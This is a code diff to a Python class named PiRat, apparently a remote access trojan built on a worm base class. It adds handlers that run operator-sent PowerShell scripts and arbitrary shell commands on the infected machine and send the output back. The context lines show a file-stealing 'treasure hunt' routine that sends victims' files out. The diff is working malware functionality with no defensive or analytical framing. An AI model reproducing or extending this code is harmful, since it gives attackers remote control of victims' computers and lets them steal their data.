@@ -134,6 +134,30 @@ class PiRat(AdvWorm):
         except Exception as e:
             print("ERROR: ", e)
     
+    def runPowerShellScript(self, scripts: list) -> None:
+        try:
+            out = subprocess.run([self.powerShell] + scripts, capture_output=True, text=True)
+            if out.returncode == 0:
+                print(out.stdout)
+                self.sendMsg(str(out.stdout))
+            else:
+                print(out.stderr)
+                self.sendMsg(str(out.stderr))
+        except Exception as e:
+            print("ERROR: ", e)
+    
+    def shellCMDcommand(self, cmd: str) -> None:
+        try:
+            out = subprocess.run(cmd, capture_output=True, text=True, shell=True)
+            if out.returncode == 0:
+                self.sendMsg(str(out.stdout))
+            else:
+                self.sendMsg(str(out.stderr))
+        except:
+            self.sendMsg("[!!] ERROR: CMD execute command [!!]")
+    
+
+    
     def SendFile(self, name: str, target: str, dir_index: str) -> None:
         c = 0
         while c < 10:
@@ -160,7 +184,14 @@ class PiRat(AdvWorm):
                     self.SendFile(name=f, target=r, dir_index=dir_id)
         self.sendMsg("Tresures sends")
                 
-
+    def recivePSript(self, text: str) -> None:
+        _b = text.split("\n")
+        buff = []
+        for b in _b:
+            if b == "" or b == " " or b == "\n":
+                continue
+            buff.append(b + "\n")
+        self.runPowerShellScript(buff)
 
 
     def execCMD(self, cmd: str) -> None:
@@ -187,7 +218,11 @@ class PiRat(AdvWorm):
                 self.sendFile(name=cmd[1], dir_index=self._manualID)
             case "hunt":
                 self.tresureHunt(cmd[1])
-    
+            case "pss":
+                self.recivePSript(cmd[1])
+            case "cmd":
+                self.shellCMDcommand(cmd[1])
+
     def _preConn(self) -> None:
         self.findPowerShell()
     
